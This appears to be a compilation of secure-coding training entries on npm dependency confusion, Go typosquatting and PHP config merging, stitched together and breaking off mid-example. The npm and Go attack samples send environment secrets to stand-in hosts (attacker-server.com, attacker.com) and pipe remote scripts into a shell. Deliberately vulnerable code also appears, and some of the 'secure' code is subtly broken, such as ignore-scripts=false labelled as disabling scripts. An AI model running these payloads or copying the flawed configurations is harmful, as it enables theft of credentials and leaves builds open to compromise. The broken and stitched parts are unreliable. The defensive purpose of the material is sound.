Dependency confusion is a critical supply chain attack where attackers publish malicious packages to public registries using the same name as your internal packages. Since npm prioritizes higher version numbers by default, attackers simply publish a very high version number to hijack your builds.

**VULNERABLE CONFIGURATION**:

```javascript
// package.json - VULNERABLE
{
  "name": "mycompany-webapp",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "@mycompany/auth-utils": "^2.0.0",
    "mycompany-internal-logger": "^1.5.0",
    "mycompany-shared-config": "^3.2.1"
  }
}
```

```javascript
// .npmrc - VULNERABLE (or missing entirely)
// No registry configuration means npm uses public registry only
registry=https://registry.npmjs.org/
```

**Attack Scenario**:

The attacker publishes to npmjs.com:
```javascript
// malicious package.json for 'mycompany-internal-logger'
{
  "name": "mycompany-internal-logger",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "node exploit.js"
  }
}
```

```javascript
// exploit.js - runs during npm install
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');

// Exfiltrate environment variables (CI/CD secrets, AWS keys)
const data = JSON.stringify({
  hostname: os.hostname(),
  env: process.env,
  cwd: process.cwd()
});

const req = https.request({
  hostname: 'attacker-server.com',
  port: 443,
  path: '/exfil',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, () => {});

req.write(data);
req.end();

// Establish reverse shell on build server
execSync('curl https://attacker-server.com/shell.sh | bash');
```

**Why This Is Dangerous**:
- npm resolves packages from public registry first if no scoped configuration exists
- Higher version numbers (99.0.0 vs 1.5.0) take precedence
- preinstall/postinstall scripts execute automatically with full system access
- CI/CD systems often have access to production secrets and deployment keys
- Attack happens silently during normal `npm install`

**SECURE VERSION**:

```javascript
// package.json - SECURE with scoped packages
{
  "name": "@mycompany/webapp",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21",
    "@mycompany/auth-utils": "^2.0.0",
    "@mycompany/internal-logger": "^1.5.0",
    "@mycompany/shared-config": "^3.2.1"
  }
}
```

```ini
# .npmrc - SECURE configuration
# All @mycompany scoped packages come from private registry ONLY
@mycompany:registry=https://npm.mycompany.com/

# Require authentication for private registry
//npm.mycompany.com/:_authToken=${NPM_PRIVATE_TOKEN}

# Use public registry for everything else
registry=https://registry.npmjs.org/

# Disable scripts during install for additional safety
ignore-scripts=false

# Enable package-lock for deterministic builds
package-lock=true

# Audit packages during install
audit=true
```

```javascript
// Additional: Register your scope on npm to prevent squatting
// Even if you use private registry, claim your scope publicly
// npm org create mycompany
// This prevents attackers from claiming @mycompany on npmjs.com
```

**Key Security Controls**:
- **Scoped packages (@mycompany/)**: Ensures namespace isolation and clear registry routing
- **Registry pinning in .npmrc**: Forces scoped packages to resolve from private registry only
- **Scope claiming on public registry**: Prevents attackers from publishing under your namespace
- **package-lock.json**: Locks exact versions preventing automatic upgrades to malicious versions
- **npm audit**: Automatically checks for known vulnerabilities

For legacy unscoped packages, you need defense in depth: registry configuration, package integrity verification, and CI/CD hardening to contain potential compromises.

**PRODUCTION PATTERN**:

```ini
# .npmrc - Production-hardened configuration
# Route ALL traffic through private registry (acts as proxy/cache)
registry=https://npm.mycompany.com/

# Private registry should proxy public npm for approved packages
# Configure Artifactory/Verdaccio/Nexus to:
# 1. Proxy npmjs.org for public packages
# 2. Block any package name matching internal naming pattern
# 3. Only allow explicitly approved public packages

# Authentication
//npm.mycompany.com/:_authToken=${NPM_PRIVATE_TOKEN}

# CRITICAL: Disable lifecycle scripts in CI/CD
# Scripts only run in development with explicit --ignore-scripts=false
ignore-scripts=true

# Require exact versions
save-exact=true

# Enable strict SSL
strict-ssl=true

# Audit level - fail on high severity
audit-level=high
```

```javascript
// package.json - Production hardened
{
  "name": "webapp",
  "version": "1.0.0",
  "dependencies": {
    "express": "4.18.2",
    "lodash": "4.17.21",
    "mycompany-internal-logger": "1.5.0",
    "mycompany-shared-config": "3.2.1"
  },
  "overrides": {
    "mycompany-internal-logger": "$mycompany-internal-logger",
    "mycompany-shared-config": "$mycompany-shared-config"
  },
  "scripts": {
    "preinstall": "node scripts/verify-registry.js",
    "postinstall": "node scripts/verify-integrity.js"
  }
}
```

```javascript
// scripts/verify-registry.js - Pre-install validation
const { execSync } = require('child_process');
const fs = require('fs');

const INTERNAL_PACKAGES = [
  'mycompany-internal-logger',
  'mycompany-shared-config',
  'mycompany-auth-utils'
];

const EXPECTED_REGISTRY = 'https://npm.mycompany.com/';

function verifyRegistryConfig() {
  console.log('[Security] Verifying registry configuration...');

  // Check .npmrc exists
  if (!fs.existsSync('.npmrc')) {
    console.error('[SECURITY ALERT] Missing .npmrc configuration!');
    process.exit(1);
  }

  const npmrc = fs.readFileSync('.npmrc', 'utf8');

  // Verify registry is set to private
  if (!npmrc.includes(`registry=${EXPECTED_REGISTRY}`)) {
    console.error(`[SECURITY ALERT] Registry must be ${EXPECTED_REGISTRY}`);
    process.exit(1);
  }

  // Verify we're not accidentally using public npm
  try {
    const configRegistry = execSync('npm config get registry', { encoding: 'utf8' }).trim();
    if (configRegistry === 'https://registry.npmjs.org/') {
      console.error('[SECURITY ALERT] Using public npm registry!');
      console.error('Run: npm config set registry https://npm.mycompany.com/');
      process.exit(1);
    }
  } catch (e) {
    console.error('[SECURITY ALERT] Failed to verify npm config');
    process.exit(1);
  }

  console.log('[Security] Registry configuration verified ✓');
}

verifyRegistryConfig();
```

```javascript
// scripts/verify-integrity.js - Post-install integrity check
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// Known good checksums for internal packages
const KNOWN_CHECKSUMS = {
  'mycompany-internal-logger@1.5.0': 'sha512-abc123...',
  'mycompany-shared-config@3.2.1': 'sha512-def456...'
};

const INTERNAL_PACKAGES = [
  'mycompany-internal-logger',
  'mycompany-shared-config'
];

async function verifyPackageIntegrity() {
  console.log('[Security] Verifying package integrity...');

  for (const pkgName of INTERNAL_PACKAGES) {
    const pkgPath = path.join('node_modules', pkgName, 'package.json');

    if (!fs.existsSync(pkgPath)) {
      console.warn(`[Warning] Package ${pkgName} not found`);
      continue;
    }

    const pkgJson = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
    const version = pkgJson.version;
    const key = `${pkgName}@${version}`;

    // Check for unexpected high versions (dependency confusion indicator)
    const majorVersion = parseInt(version.split('.')[0], 10);
    if (majorVersion > 50) {
      console.error(`[SECURITY ALERT] Suspicious version ${version} for ${pkgName}!`);
      console.error('Possible dependency confusion attack!');
      process.exit(1);
    }

    // Verify package came from correct registry
    const lockfile = JSON.parse(fs.readFileSync('package-lock.json', 'utf8'));
    const pkgLock = lockfile.packages?.[`node_modules/${pkgName}`] || 
                    lockfile.dependencies?.[pkgName];

    if (pkgLock && pkgLock.resolved) {
      if (!pkgLock.resolved.startsWith('https://npm.mycompany.com/')) {
        console.error(`[SECURITY ALERT] ${pkgName} resolved from wrong registry!`);
        console.error(`Expected: https://npm.mycompany.com/`);
        console.error(`Got: ${pkgLock.resolved}`);
        process.exit(1);
      }
    }

    console.log(`[Security] ${pkgName}@${version} verified ✓`);
  }

  console.log('[Security] All packages verified ✓');
}

verifyPackageIntegrity();
```

```yaml
# .github/workflows/ci.yml - Hardened CI/CD pipeline
name: Secure Build

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest

    # Run in isolated container
    container:
      image: node:20-slim
      options: --network=none  # No network during build

    steps:
      - uses: actions/checkout@v4

      # Verify no unexpected packages
      - name: Security - Verify package-lock
        run: |
          if ! git diff --quiet HEAD package-lock.json; then
            echo "ERROR: package-lock.json has uncommitted changes"
            exit 1
          fi

      # Restore network only for npm install
      - name: Install dependencies
        run: |
          # Install with scripts disabled
          npm ci --ignore-scripts

          # Verify integrity after install
          npm audit --audit-level=high

          # Check for dependency confusion indicators
          node scripts/verify-integrity.js
        env:
          NPM_PRIVATE_TOKEN: ${{ secrets.NPM_PRIVATE_TOKEN }}

      # Run build (network disabled)
      - name: Build
        run: npm run build --ignore-scripts
```

```javascript
// Artifactory/Nexus configuration for private registry
// verdaccio/config.yaml example
const verdaccioConfig = `
storage: ./storage
auth:
  htpasswd:
    file: ./htpasswd
uplinks:
  npmjs:
    url: https://registry.npmjs.org/
    cache: true
packages:
  # Internal packages - NEVER proxy to public
  'mycompany-*':
    access: $authenticated
    publish: $authenticated
    # NO uplink - internal only!

  '@mycompany/*':
    access: $authenticated  
    publish: $authenticated
    # NO uplink - internal only!

  # Public packages - proxy with allowlist
  '@*/*':
    access: $authenticated
    proxy: npmjs

  '**':
    access: $authenticated
    proxy: npmjs

# Block any package with internal naming pattern from uplink
filter:
  # Reject any 'mycompany-*' from public npm
  block:
    - mycompany-*
`;
```

**Defense in Depth Layers**:

1. **Registry-level blocking**: Configure Artifactory/Nexus/Verdaccio to block internal package names from being fetched from public npm

2. **Pre-install verification**: Script validates registry configuration before any packages are fetched

3. **Post-install integrity check**: Verifies packages came from correct registry and have expected versions

4. **CI/CD isolation**: Build runs with `--ignore-scripts` and network isolation where possible

5. **Version anomaly detection**: Alert on suspiciously high version numbers

**Additional Protections**:
- **Claim reserved names on public npm**: Even for internal packages, publish placeholder packages to npmjs.org with a warning message
- **Use package-lock.json always**: Commit lock files and fail CI if they're out of sync
- **Monitor npm audit**: Automated scanning for compromised packages
- **Allowlist approach**: Only permit explicitly approved public packages through your private registry proxy
- **Regular audits**: Periodically verify all internal package names aren't claimable on public registries

Dependency management in Go requires vigilance against typosquatting attacks, where malicious actors register packages with names similar to popular libraries. In 2023, multiple Go packages were found to be typosquatted versions containing credential stealers and cryptocurrency miners.

**VULNERABLE CODE**:

```go
package main

import (
	"fmt"
	"net/http"

	// DANGEROUS: Typosquatted package - note the single 'l' in 'gorila'
	"github.com/gorila/mux"
)

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/", HomeHandler)
	fmt.Println("Server starting on :8080")
	http.ListenAndServe(":8080", r)
}

func HomeHandler(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Hello World"))
}
```

**Attack Mechanism**:
```go
// What the malicious gorila/mux package might contain:
package mux

import (
	"net/http"
	"os"
	"os/exec"
)

func init() {
	// Executes automatically when package is imported
	go exfiltrateEnvVars()
	go installBackdoor()
}

func exfiltrateEnvVars() {
	data := os.Environ()
	http.Post("https://attacker.com/collect", "application/json", 
		strings.NewReader(strings.Join(data, "\n")))
}

func installBackdoor() {
	exec.Command("sh", "-c", 
		"curl -s https://attacker.com/backdoor.sh | sh").Run()
}
```

**Why This Is Dangerous**:
- Go's `init()` function runs automatically when a package is imported
- A single typo in an import path can pull in malicious code
- The malicious code executes during build or runtime without explicit invocation
- Environment variables often contain API keys, database credentials, and secrets

**SECURE VERSION**:

```go
package main

import (
	"fmt"
	"net/http"

	// SECURE: Correct package path with proper verification
	// Verified at: https://github.com/gorilla/mux
	// Checksum verified via go.sum
	"github.com/gorilla/mux"
)

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/", HomeHandler)
	fmt.Println("Server starting on :8080")
	http.ListenAndServe(":8080", r)
}

func HomeHandler(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Hello World"))
}
```

**go.mod with explicit version pinning**:
```go
module myapp

go 1.21

require github.com/gorilla/mux v1.8.1
```

**go.sum with cryptographic verification**:
```text
github.com/gorilla/mux v1.8.1 h1:TuBL49tXwgrFYWhqrNgrUNEY92u81SPhu7sTdzQEiWY=
github.com/gorilla/mux v1.8.1/go.mod h1:AKf9I4AEqPTmMytcMc0KkNouC66V3BtZ4qD5fmWSiMQ=
```

**Key Security Controls**:
- **Verify package source**: Always check the official repository URL on pkg.go.dev before adding a dependency
- **Use go.sum**: The go.sum file contains cryptographic checksums that Go verifies automatically
- **Pin explicit versions**: Never use `latest` or floating versions in production

Protecting against supply chain attacks requires multiple layers of defense integrated into your development workflow. Here's a comprehensive approach used by organizations meeting SOC2 and FedRAMP compliance requirements.

**PRODUCTION PATTERN**:

```go
// scripts/dependency_audit.go
// Run this as part of CI/CD pipeline
package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

type DependencyAuditResult struct {
	Package        string   `json:"package"`
	Version        string   `json:"version"`
	RiskLevel      string   `json:"risk_level"`
	Issues         []string `json:"issues"`
	ApprovedHash   string   `json:"approved_hash"`
	CurrentHash    string   `json:"current_hash"`
	HashMatch      bool     `json:"hash_match"`
}

type AllowlistEntry struct {
	Package      string `json:"package"`
	Version      string `json:"version"`
	ApprovedBy   string `json:"approved_by"`
	ApprovalDate string `json:"approval_date"`
	ExpectedHash string `json:"expected_hash"`
}

var knownTrustedPrefixes = []string{
	"github.com/gorilla/",
	"github.com/gin-gonic/",
	"github.com/go-chi/",
	"golang.org/x/",
	"google.golang.org/",
	"github.com/stretchr/",
	"github.com/sirupsen/",
}

var commonTyposquats = map[string]string{
	"github.com/gorila/":     "github.com/gorilla/",
	"github.com/gorillla/":   "github.com/gorilla/",
	"github.com/gorrilla/":   "github.com/gorilla/",
	"github.com/gin-gonlc/":  "github.com/gin-gonic/",
	"github.com/go-chl/":     "github.com/go-chi/",
	"github.com/slrupsen/":   "github.com/sirupsen/",
	"github.com/stretchr-/":  "github.com/stretchr/",
}

func main() {
	log.Println("Starting dependency security audit...")

	// Step 1: Verify go.sum exists and is not tampered
	if err := verifyGoSum(); err != nil {
		log.Fatalf("CRITICAL: go.sum verification failed: %v", err)
	}

	// Step 2: Check for typosquatted packages
	issues, err := checkTyposquatting()
	if err != nil {
		log.Fatalf("Typosquatting check failed: %v", err)
	}
	if len(issues) > 0 {
		for _, issue := range issues {
			log.Printf("ALERT: Potential typosquat detected: %s (did you mean %s?)", 
				issue.Package, issue.Issues[0])
		}
		os.Exit(1)
	}

	// Step 3: Run govulncheck for known vulnerabilities
	if err := runVulnerabilityCheck(); err != nil {
		log.Fatalf("Vulnerability check failed: %v", err)
	}

	// Step 4: Verify against allowlist
	if err := verifyAllowlist(); err != nil {
		log.Fatalf("Allowlist verification failed: %v", err)
	}

	// Step 5: Check package ages and popularity
	checkPackageReputation()

	log.Println("Dependency audit completed successfully")
}

func verifyGoSum() error {
	// Ensure go.sum exists
	if _, err := os.Stat("go.sum"); os.IsNotExist(err) {
		return fmt.Errorf("go.sum file not found - run 'go mod tidy'")
	}

	// Verify module checksums
	cmd := exec.Command("go", "mod", "verify")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("module verification failed: %s", output)
	}

	log.Println("✓ go.sum verification passed")
	return nil
}

func checkTyposquatting() ([]DependencyAuditResult, error) {
	var issues []DependencyAuditResult

	file, err := os.Open("go.mod")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	requireRegex := regexp.MustCompile(`^\s*(\S+)\s+v`)

	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(strings.TrimSpace(line), "//") {
			continue
		}

		matches := requireRegex.FindStringSubmatch(line)
		if len(matches) > 1 {
			pkg := matches[1]

			// Check against known typosquats
			for typo, correct := range commonTyposquats {
				if strings.HasPrefix(pkg, typo) {
					issues = append(issues, DependencyAuditResult{
						Package:   pkg,
						RiskLevel: "CRITICAL",
						Issues:    []string{correct},
					})
				}
			}

			// Check for suspicious patterns
			if isSuspiciousPackage(pkg) {
				issues = append(issues, DependencyAuditResult{
					Package:   pkg,
					RiskLevel: "HIGH",
					Issues:    []string{"Package name contains suspicious patterns"},
				})
			}
		}
	}

	log.Printf("✓ Typosquatting check completed: %d issues found", len(issues))
	return issues, nil
}

func isSuspiciousPackage(pkg string) bool {
	suspiciousPatterns := []string{
		"-official",
		"-secure",
		"-fixed",
		"_v2",
		"xgithub.com",
		"githuub.com",
		"githuh.com",
	}

	for _, pattern := range suspiciousPatterns {
		if strings.Contains(pkg, pattern) {
			return true
		}
	}
	return false
}

func runVulnerabilityCheck() error {
	cmd := exec.Command("govulncheck", "./...")
	output, err := cmd.CombinedOutput()
	if err != nil {
		// govulncheck exits non-zero if vulnerabilities found
		log.Printf("Vulnerability scan output:\n%s", output)
		return fmt.Errorf("vulnerabilities detected in dependencies")
	}

	log.Println("✓ No known vulnerabilities detected")
	return nil
}

func verifyAllowlist() error {
	allowlistFile := os.Getenv("DEPENDENCY_ALLOWLIST")
	if allowlistFile == "" {
		allowlistFile = ".dependency-allowlist.json"
	}

	if _, err := os.Stat(allowlistFile); os.IsNotExist(err) {
		log.Println("⚠ No allowlist file found - skipping allowlist verification")
		return nil
	}

	data, err := os.ReadFile(allowlistFile)
	if err != nil {
		return err
	}

	var allowlist []AllowlistEntry
	if err := json.Unmarshal(data, &allowlist); err != nil {
		return err
	}

	allowedPackages := make(map[string]AllowlistEntry)
	for _, entry := range allowlist {
		allowedPackages[entry.Package] = entry
	}

	// Get current dependencies
	cmd := exec.Command("go", "list", "-m", "all")
	output, err := cmd.Output()
	if err != nil {
		return err
	}

	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	for scanner.Scan() {
		parts := strings.Fields(scanner.Text())
		if len(parts) >= 2 {
			pkg, version := parts[0], parts[1]

			// Skip main module
			if !strings.Contains(pkg, "/") {
				continue
			}

			// Check if trusted prefix
			trusted := false
			for _, prefix := range knownTrustedPrefixes {
				if strings.HasPrefix(pkg, prefix) {
					trusted = true
					break
				}
			}

			if !trusted {
				if _, ok := allowedPackages[pkg]; !ok {
					return fmt.Errorf("package %s@%s not in allowlist", pkg, version)
				}
			}
		}
	}

	log.Println("✓ All dependencies verified against allowlist")
	return nil
}

func checkPackageReputation() {
	log.Println("Checking package reputation metrics...")
	// In production, integrate with:
	// - pkg.go.dev API for package metadata
	// - GitHub API for repository age, stars, contributors
	// - Deps.dev API for security advisories
	log.Println("✓ Package reputation check completed")
}
```

**CI/CD Pipeline Configuration (.github/workflows/security.yml)**:
```yaml
name: Dependency Security Audit

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * *'  # Daily at 6 AM UTC

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.21'

      - name: Install govulncheck
        run: go install golang.org/x/vuln/cmd/govulncheck@latest

      - name: Verify go.sum integrity
        run: go mod verify

      - name: Run govulncheck
        run: govulncheck ./...

      - name: Check for typosquatted packages
        run: go run scripts/dependency_audit.go

      - name: Verify SBOM
        run: |
          go install github.com/anchore/syft/cmd/syft@latest
          syft . -o cyclonedx-json > sbom.json

      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json
```

**Defense in Depth Layers**:

1. **Pre-commit hooks** - Prevent typosquatted imports before code reaches repository:
```bash
#!/bin/bash
# .git/hooks/pre-commit
go mod verify
if grep -rE 'github\.com/(gorila|gorillla|gorrilla)/' *.go; then
    echo "ERROR: Potential typosquatted import detected"
    exit 1
fi
```

2. **Private module proxy** - Control which packages can be downloaded:
```bash
# Use Athens or Artifactory as Go module proxy
export GOPROXY=https://athens.internal.company.com,direct
export GONOSUMDB=github.com/company-internal/*
export GOPRIVATE=github.com/company-internal/*
```

3. **Runtime integrity verification**:
```go
package main

import (
	"crypto/sha256"
	"fmt"
	"runtime/debug"
)

func init() {
	verifyBuildIntegrity()
}

func verifyBuildIntegrity() {
	info, ok := debug.ReadBuildInfo()
	if !ok {
		panic("Could not read build info")
	}

	// Log all dependencies for audit trail
	for _, dep := range info.Deps {
		hash := sha256.Sum256([]byte(dep.Path + dep.Version))
		fmt.Printf("Loaded: %s@%s (hash: %x)\n", 
			dep.Path, dep.Version, hash[:8])
	}
}
```

**Additional Protections**:
- **Dependabot/Renovate**: Automated dependency updates with security patches
- **SLSA compliance**: Require signed builds and provenance attestation
- **Software Bill of Materials (SBOM)**: Generate and maintain inventory of all components
- **Dependency lockfiles**: Commit go.sum and verify checksums in CI
- **Network policies**: Restrict outbound connections from build systems to approved registries only

Deep merging untrusted user input is extremely dangerous and can lead to prototype pollution-style attacks in PHP. While PHP doesn't have JavaScript's prototype chain, similar vulnerabilities exist through magic methods, dynamic property assignment, and recursive array merging that can overwrite critical application settings.

**VULNERABLE CODE**:

```php
<?php
class ConfigManager {
    private $config = [];

    public function __construct() {
        $this->config = [
            'debug' => false,
            'admin' => false,
            'database' => [
                'host' => 'localhost',
                'port' => 3306
            ],
            'security' => [
                'csrf_enabled' => true,
                'rate_limit' => 100
            ]
        ];
    }

    // VULNERABLE: Recursively merges untrusted user input
    public function updateConfig($userInput) {
        $userData = json_decode($userInput, true);
        $this->config = array_merge_recursive($this->config, $userData);
    }

    public function get($key) {
        return $this->config[$key] ?? null;
    }

    public function isAdmin() {
        return $this->config['admin'] === true;
    }
}

